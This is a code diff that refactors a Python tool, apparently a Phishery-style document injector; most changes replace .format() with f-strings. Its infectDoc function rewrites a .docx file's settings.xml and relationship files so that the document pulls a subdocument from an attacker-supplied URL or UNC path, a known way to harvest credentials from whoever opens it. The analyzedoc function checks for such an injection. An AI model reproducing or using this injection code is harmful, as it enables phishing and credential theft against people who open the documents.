@@ -137,26 +137,30 @@ class UpdateableZipFile(ZipFile):
 def analyzedoc(infile):
     try:
         with ZipFile(infile) as arc:
-                if arc.namelist().__contains__('word/_rels/settings.xml.rels'):
-                    print("[+] word/_rels/settings.xml.rels discovered.")
-                    with arc.open('word/_rels/settings.xml.rels') as fr:
-                        doc = xmltodict.parse(fr.read())
-                    if doc.has_key('Relationships'):
-                        if doc['Relationships']['Relationship'].has_key('@Id'):
-                            if doc['Relationships']['Relationship']['@Id'] == 'rId1337':
-                                print("[!] Phishery injection confirmed.")
-                                tURL = doc['Relationships']['Relationship']['@Target']
-                                print("[!] Target URL: {}".format(tURL))
-                            else:
-                                print("[!] Relationship discovered is {}".format(doc['Relationships']['Relationship']['@Id']))
-                                if doc['Relationships']['Relationship'].has_key('@Target'):
-                                    tURL = doc['Relationships']['Relationship']['@Target']
-                                    print("[!] Target URL: {}".format(tURL))
-                            return True
+            if arc.namelist().__contains__('word/_rels/settings.xml.rels'):
+                print("[+] word/_rels/settings.xml.rels discovered.")
+                with arc.open('word/_rels/settings.xml.rels') as fr:
+                    doc = xmltodict.parse(fr.read())
+                if doc.has_key('Relationships') and doc['Relationships'][
+                    'Relationship'
+                ].has_key('@Id'):
+                    if doc['Relationships']['Relationship']['@Id'] == 'rId1337':
+                        print("[!] Phishery injection confirmed.")
+                        tURL = doc['Relationships']['Relationship']['@Target']
+                        print(f"[!] Target URL: {tURL}")
+                    else:
+                        print(
+                            f"[!] Relationship discovered is {doc['Relationships']['Relationship']['@Id']}"
+                        )
+
+                        if doc['Relationships']['Relationship'].has_key('@Target'):
+                            tURL = doc['Relationships']['Relationship']['@Target']
+                            print(f"[!] Target URL: {tURL}")
+                    return True
     except(KeyError):
         pass
-    except(IOError):
-        print("[-] {}: No such file".format(infile))
+    except IOError:
+        print(f"[-] {infile}: No such file")
         raise SystemExit
 
     return False
@@ -170,21 +174,21 @@ def infectDoc(goodocx, badocx, url, identifier, reinfect=False):
             with arc.open('word/settings.xml') as fr:
                 docx = fr.read()
             oldid = docx.split('r:id=')[1].split('"')[1]
-            print("[*] Replacing old ID ({}) with rId{}".format(oldid, identifier))
-            settingsxml = docx.replace(oldid, "rId{}".format(identifier))
+            print(f"[*] Replacing old ID ({oldid}) with rId{identifier}")
+            settingsxml = docx.replace(oldid, f"rId{identifier}")
     else:
         with ZipFile(badocx) as arc:
             with arc.open('word/settings.xml') as fr:
                 docx = fr.read()
             closepos = docx.index('/>')
             prepos = docx[:closepos]
-            editpos = '/><w:p><w:subDoc r:id="rId{}"/></w:p>'.format(identifier)
+            editpos = f'/><w:p><w:subDoc r:id="rId{identifier}"/></w:p>'
             postpos = docx[closepos:]
-            settingsxml = "{}{}{}".format(prepos, editpos, postpos)
+            settingsxml = f"{prepos}{editpos}{postpos}"
     with UpdateableZipFile(badocx, "a") as inj:
         inj.writestr("word/settings.xml", settingsxml)
         inj.writestr("word/_rels/settings.xml.rels", SETRELS.format(identifier, url))
-    print("[*] {} has been injected and output is: {}".format(goodocx, badocx))
+    print(f"[*] {goodocx} has been injected and output is: {badocx}")
 
 def main():
     try:
@@ -216,7 +220,7 @@ def main():
                 print("[!] Please specify listening UNC path via -u|--url")
                 raise SystemExit
 
-            print("[+] Infecting {}".format(args.infile))
+            print(f"[+] Infecting {args.infile}")
             infectDoc(args.infile, args.outfile, args.url, args.identifier, False)
 
     except(KeyboardInterrupt):
